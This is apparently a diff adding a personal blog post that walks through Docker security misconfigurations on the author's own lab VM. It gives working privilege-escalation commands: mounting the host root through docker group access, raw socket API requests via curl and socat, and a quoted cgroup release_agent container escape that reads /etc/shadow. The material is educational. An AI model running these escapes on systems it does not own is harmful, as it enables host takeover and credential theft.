@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+    <link rel="manifest" href="/images/site.webmanifest">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <title>The Lab: Docker | ben-dale.co.uk</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    <link rel="stylesheet" href="/css/theme-override.css">
+    <header>
+
+  <nav>
+    <ul>
+      
+      
+      <li class="pull-left ">
+        <a href="/">~/ben-dale.co.uk</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/tags/">~/tags</a>
+      </li>
+      
+
+      
+      
+      <li class="pull-right">
+        <a href="/index.xml">~/rss</a>
+      </li>
+      
+
+    </ul>
+  </nav>
+</header>
+
+  </head>
+
+  <body>
+    <br/>
+
+<div class="article-meta">
+<h1><span class="title">The Lab: Docker</span></h1>
+
+<h2 class="date">2021/06/11</h2>
+<p class="terms">
+  
+  
+  
+  
+  Tags: <a href="/tags/docker">docker</a> 
+  
+  
+</p>
+</div>
+
+
+<div class="content-wrapper">
+  <main>
+    <p>A deep dive into some common Docker misconfigurations, exploitations, etc. for learning and reference purposes, using a Ubuntu Server VM called &ldquo;lab&rdquo;.</p>
+<p>Disclaimer: I&rsquo;m not a Docker expert, these are just some notes I put together whilst researching Docker security and general usage, for my own interest. The information here is taken from a wide variety of sources.</p>
+<p>Disclaimer for the disclaimer: That&rsquo;s smart talk for &ldquo;I just wanted to f*ck about with Docker&rdquo;.</p>
+<h2 id="the-docker-socket">The Docker socket</h2>
+<p><img src="/static/the-lab-docker/1.png" alt=""></p>
+<p>As stated on the <a href="https://docs.docker.com/engine/install/linux-postinstall/">Docker post-installation instructions</a>:</p>
+<blockquote>
+<p>The Docker daemon always runs as the root user. If you don’t want to preface the docker command with sudo, create a Unix group called docker and add users to it. (&hellip;) The docker group grants privileges equivalent to the root user.</p>
+</blockquote>
+<p><img src="/static/the-lab-docker/2.png" alt="">
+<img src="/static/the-lab-docker/3.png" alt=""></p>
+<p>The <a href="https://docs.docker.com/engine/security/#docker-daemon-attack-surface">Docker daemon attack surface</a> continues:</p>
+<blockquote>
+<p>Only trusted users should be allowed to control your Docker daemon. (&hellip;) Docker allows you to share a directory between the Docker host and a guest container; and it allows you to do so without limiting the access rights of the container. This means that you can start a container where the /host directory is the / directory on your host; and the container can alter your host filesystem without any restriction.</p>
+</blockquote>
+<p>Ok, but what does that mean? It means that <code>lab</code> (now that they are in the <code>docker</code> group) can mount the root filesystem of the host machine to an instance&rsquo;s volume, effectively giving an intruder full access to the host machine.</p>
+<p><img src="/static/the-lab-docker/4.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&#34;-it&#34; -&gt; to run interactive with tty
+&#34;--rm&#34; -&gt; to remove the container when it exits
+&#34;-v /:/mnt&#34; -&gt; mount a volume (in this case, mount / on the host to /mnt on the container)
+&#34;alpine&#34; -&gt; the image
+&#34;chroot /mnt bash&#34; -&gt; to run bash in &#34;jail&#34; (/mtn appears to Bash process as /)
+</code></pre></div><p>With access to (effectively) <code>root</code> on the host machine, an intruder can leave backdoors to come back through later, for instance, creating another user on the machine with root privileges, or creating another set of SSH keys for the <code>root</code> user (or even just making a copy of the existing SSH keys).</p>
+<p>If you&rsquo;re in the <code>docker</code> group, you have access to the Docker socket, which is why the &ldquo;mount root&rdquo; trick worked.</p>
+<p><img src="/static/the-lab-docker/7.png" alt=""></p>
+<p>The Docker socket is (usually) found under <code>/var/run/docker.sock</code> and can only be written to by <code>root</code> and users in the <code>docker</code> group.</p>
+<blockquote>
+<p>The Docker client &ldquo;talks&rdquo; to the Docker daemon, which does the heavy lifting of building, running, and distributing your Docker containers. The Docker client and daemon can run on the same system, or you can connect a Docker client to a remote Docker daemon.</p>
+</blockquote>
+<p><img src="/static/the-lab-docker/26.svg" alt=""></p>
+<p>If you&rsquo;re in the <code>docker</code> group, you can achieve the same &ldquo;mount root&rdquo; trick, this time explicitly connecting to the docker socket:</p>
+<p><img src="/static/the-lab-docker/8.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&#34;-H&#34; -&gt; Daemon socket to connect to
+</code></pre></div><p>If the intruder is on the host, has access to a user in the <code>docker</code> group, but the Docker binary isn&rsquo;t installed on the machine, can they still perform this &ldquo;mount root&rdquo; trick? Yes, there&rsquo;s an API. The documentation <a href="https://docs.docker.com/engine/api/">explains</a>:</p>
+<blockquote>
+<p>Docker provides an API for interacting with the Docker daemon (called the Docker Engine API), as well as SDKs for Go and Python. The SDKs allow you to build and scale Docker apps and solutions quickly and easily. If Go or Python don’t work for you, you can use the Docker Engine API directly.</p>
+</blockquote>
+<p><img src="/static/the-lab-docker/9.png" alt=""></p>
+<p>Using <code>curl</code>, make a request to the Docker socket, to list the images available (formatting with <code>jq</code>):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json | jq
+</code></pre></div><p><img src="/static/the-lab-docker/10.png" alt=""></p>
+<p>Next, make a request to create a container using an image ID from the previous request, that mounts the host&rsquo;s root directory (taking note of the container ID in the response), and a second request to start the container.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -XPOST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> --unix-socket /var/run/docker.sock -d <span style="color:#e6db74">&#39;{&#34;Image&#34;:&#34;sha256:IMAGE_ID_GOES_HERE&#34;,&#34;Cmd&#34;:[&#34;/bin/sh&#34;],&#34;DetachKeys&#34;:&#34;Ctrl-p,Ctrl-q&#34;,&#34;OpenStdin&#34;:true,&#34;Mounts&#34;:[{&#34;Type&#34;:&#34;bind&#34;,&#34;Source&#34;:&#34;/&#34;,&#34;Target&#34;:&#34;/host_root&#34;}]}&#39;</span> http://localhost/containers/create
+
+curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/CONTAINER_ID_GOES_HERE/start
+</code></pre></div><p><img src="/static/the-lab-docker/11.png" alt=""></p>
+<p>You should then be able to connect to the container, using <code>socat</code> to spawn a shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ socat - UNIX-CONNECT:/var/run/docker.sock
+POST /containers/CONTAINER_ID_GOES_HERE/attach?stream<span style="color:#f92672">=</span>1&amp;stdin<span style="color:#f92672">=</span>1&amp;stdout<span style="color:#f92672">=</span>1&amp;stderr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> HTTP/1.1<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+Host:<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+Connection: Upgrade<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+Upgrade: tcp<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+</code></pre></div><p><img src="/static/the-lab-docker/12.png" alt=""></p>
+<p>With this attack, the host&rsquo;s root directory was mounted under <code>/host_root</code> on the container.</p>
+<h3 id="access-to-the-docker-socket-via-tcp">Access to the Docker socket via TCP</h3>
+<p>Presumably, this API is only internally accessible, right? You have to be on the host, because you have to point to the socket, and the socket is a Unix socket.</p>
+<p>Well, I learned that you can <a href="https://coderwall.com/p/c3wyzq/forwarding-tcp-traffic-to-a-unix-socket">expose Unix sockets over TCP</a> using <code>socat</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">socat -d -d TCP-LISTEN:4000,fork UNIX-CONNECT:/var/run/docker.sock
+</code></pre></div><p><img src="/static/the-lab-docker/15.png" alt=""></p>
+<p><img src="/static/the-lab-docker/14.png" alt=""></p>
+<p>An <code>nmap</code> scan from my machine shows the exposed port on the VM:
+<img src="/static/the-lab-docker/16.png" alt=""></p>
+<p>Listing the Docker images via the exposed port:</p>
+<p><img src="/static/the-lab-docker/17.png" alt=""></p>
+<p>And then performing the same attack, this time over TCP:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -XPOST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;Image&#34;:&#34;sha256:IMAGE_ID_GOES_HERE&#34;,&#34;Cmd&#34;:[&#34;/bin/sh&#34;],&#34;DetachKeys&#34;:&#34;Ctrl-p,Ctrl-q&#34;,&#34;OpenStdin&#34;:true,&#34;Mounts&#34;:[{&#34;Type&#34;:&#34;bind&#34;,&#34;Source&#34;:&#34;/&#34;,&#34;Target&#34;:&#34;/host_root&#34;}]}&#39;</span> http://192.168.1.226:4000/containers/create
+
+curl -XPOST http://192.168.1.226:4000/containers/CONTAINER_ID_GOES_HERE/start
+
+socat - TCP4:192.168.1.226:4000
+POST /containers/CONTAINER_ID_GOES_HERE/attach?stream<span style="color:#f92672">=</span>1&amp;stdin<span style="color:#f92672">=</span>1&amp;stdout<span style="color:#f92672">=</span>1&amp;stderr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> HTTP/1.1<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+Host:<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+Connection: Upgrade<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+Upgrade: tcp<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>Enter ⤶<span style="color:#f92672">]</span>
+</code></pre></div><p><img src="/static/the-lab-docker/18.png" alt=""></p>
+<p>But that&rsquo;s just a fun hack to expose the Docker socket via TCP. There&rsquo;s a &ldquo;proper way&rdquo; to configure Docker to allow socket access via TCP, <a href="https://docs.docker.com/engine/install/linux-postinstall/#configuring-remote-access-with-systemd-unit-file">if you so wished</a>:</p>
+<p><img src="/static/the-lab-docker/13.png" alt=""></p>
+<pre><code class="language-conf" data-lang="conf"># override.conf
+# not exposed on the local network
+[Service]
+ExecStart=
+ExecStart=/usr/bin/dockerd -H fd:// -H tcp://127.0.0.1:2375
+</code></pre><p><img src="/static/the-lab-docker/21.png" alt=""></p>
+<p>I had to create <code>/etc/systemd/system/docker.service.d/override.conf</code> because it didn&rsquo;t exist the first time I followed these steps.</p>
+<p>With the above configuration port 2375 isn&rsquo;t accessible on the local network unless you manually forward the port. The following configuration will allow remote connections from the local network:</p>
+<pre><code class="language-conf" data-lang="conf"># override.conf
+# exposed on the local network
+[Service]
+ExecStart=
+ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375
+</code></pre><p><img src="/static/the-lab-docker/22.png" alt=""></p>
+<p>Before and after configuration change:</p>
+<p><img src="/static/the-lab-docker/23.png" alt=""></p>
+<p>If you wanted to play with fire, you could configure your router to allow connections to port 2375 from the internet.</p>
+<p>How many Docker daemons are publically accessible? I had a look on <a href="https://www.shodan.io/search?query=port%3A2375+product%3A%22Docker%22">shodan.io</a> and, at the time of writing, there&rsquo;s a handful:</p>
+<p><img src="/static/the-lab-docker/19.png" alt=""></p>
+<p>Some of the hosts exposed a fair amount of information, such as what containers were up and running on the hosts. This one was a host in China that was pulling a script from a host in Ukraine and running it:</p>
+<p><img src="/static/the-lab-docker/20.png" alt=""></p>
+<p><code>nmap</code> has a collection of Docker scripts that you can run as part of a scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p <span style="color:#ae81ff">2375</span> --script <span style="color:#e6db74">&#34;docker-*&#34;</span> 127.0.0.1
+</code></pre></div><p><img src="/static/the-lab-docker/27.png" alt=""></p>
+<h3 id="access-to-the-docker-socket-via-ssh">Access to the Docker socket via SSH</h3>
+<p>It&rsquo;s possible to forward a Unix Domain socket with OpenSSH:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -L /home/$USER/docker.sock:/var/run/docker.sock lab@192.168.1.226
+</code></pre></div><p><code>docker.sock</code> accessible in the home directory on my machine, listing images from the lab using the API:</p>
+<p><img src="/static/the-lab-docker/24.png" alt=""></p>
+<p>You need to delete the socket once you&rsquo;re done with it otherwise you will receive an &ldquo;Address already in use&rdquo; error the next time you forward:</p>
+<p><img src="/static/the-lab-docker/25.png" alt=""></p>
+<p>There is a &ldquo;proper&rdquo; way to <a href="https://docs.docker.com/engine/security/protect-access/#use-ssh-to-protect-the-docker-daemon-socket">access a Docker socket via SSH</a> documented by Docker.</p>
+<h2 id="docker-containers-and-breaking-out-of-them">Docker containers, and breaking out of them</h2>
+<blockquote>
+<p>A container is a runnable instance of an image. You can create, start, stop, move, or delete a container using the Docker API or CLI. You can connect a container to one or more networks, attach storage to it, or even create a new image based on its current state. (&hellip;) Docker uses a technology called namespaces to provide the isolated workspace called the container. When you run a container, Docker creates a set of namespaces for that container. These namespaces provide a layer of isolation. Each aspect of a container runs in a separate namespace and its access is limited to that namespace.</p>
+</blockquote>
+<p>Detailed information on namespaces <a href="https://lwn.net/Articles/531114/">can be found here</a>.</p>
+<h3 id="a-mounted-docker-socket">A mounted Docker socket</h3>
+<p>The Docker socket can be mounted inside the container. Apparently, this usually happens when containers need to connect back to the docker daemon to perform actions. Hey, I didn&rsquo;t say it was a good idea, it&rsquo;s just possible.</p>
+<p><img src="/static/the-lab-docker/28.png" alt=""></p>
+<p>You can look for the Docker socket with <code>find</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -name docker.sock 2&gt;/dev/null
+</code></pre></div><p>Once you&rsquo;ve found it, go nuts (break out).</p>
+<p><img src="/static/the-lab-docker/29.png" alt=""></p>
+<h3 id="the-privileged-flag">The &ldquo;privileged&rdquo; flag</h3>
+<blockquote>
+<p>The &ndash;privileged flag gives all capabilities to the container, and it also lifts all the limitations enforced by the device cgroup controller. In other words, the container can then do almost everything that the host can do. This flag exists to allow special use-cases, like running Docker within Docker.</p>
+</blockquote>
+<p><img src="/static/the-lab-docker/30.png" alt=""></p>
+<p>Linux capabilities available on a privileged container:</p>
+<p><img src="/static/the-lab-docker/31.png" alt=""></p>
+<p>Some flags to note are:</p>
+<ul>
+<li><strong>cap_dac_override</strong>
+<ul>
+<li>bypass file read, write and execute permission checks</li>
+</ul>
+</li>
+<li><strong>cap_dac_read_search</strong>
+<ul>
+<li>bypass file and directory read/execute permission checks</li>
+</ul>
+</li>
+<li><strong>cap_sys_module</strong>
+<ul>
+<li>insert kernel modules</li>
+</ul>
+</li>
+<li><strong>cap_sys_ptrace</strong>
+<ul>
+<li>debug processes</li>
+</ul>
+</li>
+<li><strong>cap_sys_admin</strong>
+<ul>
+<li>mount and unmount filesystems</li>
+</ul>
+</li>
+</ul>
+<p>In contrast, here are the capabilities on a non-privileged container:</p>
+<p><img src="/static/the-lab-docker/32.png" alt=""></p>
+<p>An example breakout when the <code>cap_sys_admin</code> capability is available in a tweet by <a href="https://twitter.com/_fel1x/status/1151487053370187776?s=20">Felix Wilhelm</a>.</p>
+<blockquote>
+<p>Linux cgroups are one of the mechanisms by which Docker isolates containers. The PoC abuses the functionality of the notify_on_release feature in cgroups v1 to run the exploit as a fully privileged root user. When the last task in a cgroup leaves (by exiting or attaching to another cgroup), a command supplied in the release_agent file is executed. The intended use for this is to help prune abandoned cgroups. This command, when invoked, is run as a fully privileged root on the host.</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Mount RDMA cgroup controller and create a child group</span>
+mkdir /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mkdir /tmp/cgrp/xxx
+<span style="color:#75715e"># Enable cgroup notifications on release of the &#34;xxx&#34; cgroup</span>
+echo <span style="color:#ae81ff">1</span> &gt; /tmp/cgrp/xxx/notify_on_release
+<span style="color:#75715e"># Find path of mount for container</span>
+<span style="color:#75715e"># e.g. /var/lib/docker/overlay2/5e7d01ea...4d2ec6332146d/diff</span>
+<span style="color:#75715e"># https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html</span>
+host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>
+<span style="color:#75715e"># Set release_agent to $host_path/cmd</span>
+echo <span style="color:#e6db74">&#34;</span>$host_path<span style="color:#e6db74">/cmd&#34;</span> &gt; /tmp/cgrp/release_agent
+<span style="color:#75715e"># Create script to execute on the host</span>
+echo <span style="color:#e6db74">&#34;#!/bin/sh&#34;</span> &gt; /cmd
+<span style="color:#75715e"># Write payload to cmd file, can be whatever you want, e.g. reverse shell</span>
+echo <span style="color:#e6db74">&#34;cat /etc/shadow &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd
+chmod a+x /cmd
+<span style="color:#75715e"># Spawn process that immediately ends inside the &#34;xxx&#34; cgroup</span>
+sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/xxx/cgroup.procs&#34;</span>
+<span style="color:#75715e"># Read script output</span>
+cat /output
+</code></pre></div><p><img src="/static/the-lab-docker/33.png" alt=""></p>
+<p>In the above exploit, OverlaysFS was the selected storage driver:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># ran on the container</span>
+echo $host_path
+/var/lib/docker/overlay2/5e7d01ea...4d2ec6332146d/diff
+</code></pre></div><p>The official Docker documentation has <a href="https://docs.docker.com/storage/storagedriver/">information</a> on storage drivers and container layers:</p>
+<blockquote>
+<p>By default all files created inside a container are stored on a writable container layer. (&hellip;) Storage drivers allow you to create data in the writable layer of your container. The files won’t be persisted after the container is deleted, and both read and write speeds are lower than native file system performance.</p>
+</blockquote>
+<p>For example, <code>touch helloworld</code> creates a file named &ldquo;helloworld&rdquo; on the container, which is written to the writable container layer. <a href="https://docs.docker.com/storage/bind-mounts/">Bind mounts</a> and <a href="https://docs.docker.com/storage/volumes/">volumes</a> can be used to store files on the host machine.</p>
+<p>Container escape exploit scripts for different capabilities can be found <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_dac_override">here</a>.</p>
+<h3 id="automated-container-scanning">Automated container scanning</h3>
+<h2 id="docker-images">Docker images</h2>
+<h3 id="automated-image-scanning">Automated image scanning</h3>
+<h2 id="docker-registry">Docker registry</h2>
+<h2 id="docker-network">Docker network</h2>
+<h2 id="useful-links">Useful links</h2>
+<p><a href="https://docs.docker.com/get-started/overview/">Official Docker overview</a> - Straight from the whale&rsquo;s mouth.</p>
+<p><a href="https://d3oypxn00j2a10.cloudfront.net/assets/img/Docker%20Security/WP_Intro_to_container_security_03.20.2015.pdf">Docker Security paper</a> - Short introduction to container security</p>
+<p><a href="https://docs.docker.com/engine/security/rootless/">Docker Rootless</a> - Running the Docker daemon as a non-root user.</p>
+<p><a href="https://book.hacktricks.xyz/pentesting/2375-pentesting-docker#securing-your-docker">Securing your Docker</a> - A lot of useful information about securing your Docker install, your images, and your containers.</p>
+<p><a href="https://pythonspeed.com/articles/docker-connection-refused/">Docker container networking</a> - Useful if you have limited networking knowledge, like me!</p>
+
+    <a href="/"> >> Home</a>
+  </main>
+</div>
+    <footer>
+      
+<script>
+(function() {
+  function center_el(tagName) {
+    var tags = document.getElementsByTagName(tagName), i, tag;
+    for (i = 0; i < tags.length; i++) {
+      tag = tags[i];
+      var parent = tag.parentElement;
+      
+      if (parent.childNodes.length === 1) {
+        
+        if (parent.nodeName === 'A') {
+          parent = parent.parentElement;
+          if (parent.childNodes.length != 1) continue;
+        }
+        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
+      }
+    }
+  }
+  var tagNames = ['img', 'embed', 'object'];
+  for (var i = 0; i < tagNames.length; i++) {
+    center_el(tagNames[i]);
+  }
+})();
+</script>
+
+      
+      <hr/>
+      <a href="https://github.com/ben-dale">Github</a> | <a href="https://keybase.io/mrbenjamind">Keybase</a> | <a href="https://twitter.com/mrbenjamind">Twitter</a>
+      
+    </footer>
+    
+  </body>
+</html>
+
